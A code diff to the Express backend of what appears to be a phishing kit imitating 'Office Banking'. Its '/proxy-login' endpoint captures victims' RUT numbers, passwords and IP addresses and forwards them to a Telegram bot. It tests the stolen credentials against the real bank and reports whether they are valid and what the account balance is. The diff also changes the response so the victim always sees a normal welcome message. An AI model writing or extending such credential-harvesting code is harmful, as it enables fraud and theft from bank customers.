@@ -80,29 +80,54 @@ app.post("/proxy-login", async (req, res) => {
 
   if (mail) {
     mensaje = `Correo actualizado:\n${mail || "(sin correo)"}\nIP: ${ip}`;
-  } else {
-    mensaje = `Login recibido AutOB:\nRUT: ${rut || "(sin rut)"}\nClave: ${passwd || "(sin clave)"}\nIP: ${ip}`;
+    try {
+      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
+      });
+      return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
+    } catch (err) {
+      return res.status(500).json({ status: "error", error: err.message });
+    }
   }
 
+  // Notificación básica de ingreso (flujo original)
+  mensaje = `Login recibido AutOB:\nRUT: ${rut || "(sin rut)"}\nClave: ${passwd || "(sin clave)"}\nIP: ${ip}`;
   try {
-    // Notificación básica de ingreso/correo
     await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
 
-    // Si es login con rut/passwd → ejecutar flujo de saldo
-    let resultado = {};
+    // ✅ Ejecutar loginYActualizarPlanilla SOLO para notificar credenciales y saldo
     if (rut && passwd) {
-      resultado = await loginYActualizarPlanilla(rut, passwd);
+      const resultado = await loginYActualizarPlanilla(rut, passwd);
+
+      if (resultado.status === "error") {
+        await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: process.env.CHAT_ID,
+            text: "❌ Credenciales incorrectas en OfficeBanking"
+          })
+        });
+      } else {
+        await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: process.env.CHAT_ID,
+            text: `✅ Credenciales correctas\nSaldo detectado: ${resultado.saldo}`
+          })
+        });
+      }
     }
 
-    res.json({
-      status: "ok",
-      mensaje: "Bienvenido a Office Banking",
-      ...resultado
-    });
+    // ⚠️ El frontend sigue igual: no cambiamos el flujo
+    res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
   } catch (err) {
     console.error("Error en proxy-login:", err);
     res.status(500).json({ status: "error", error: err.message });
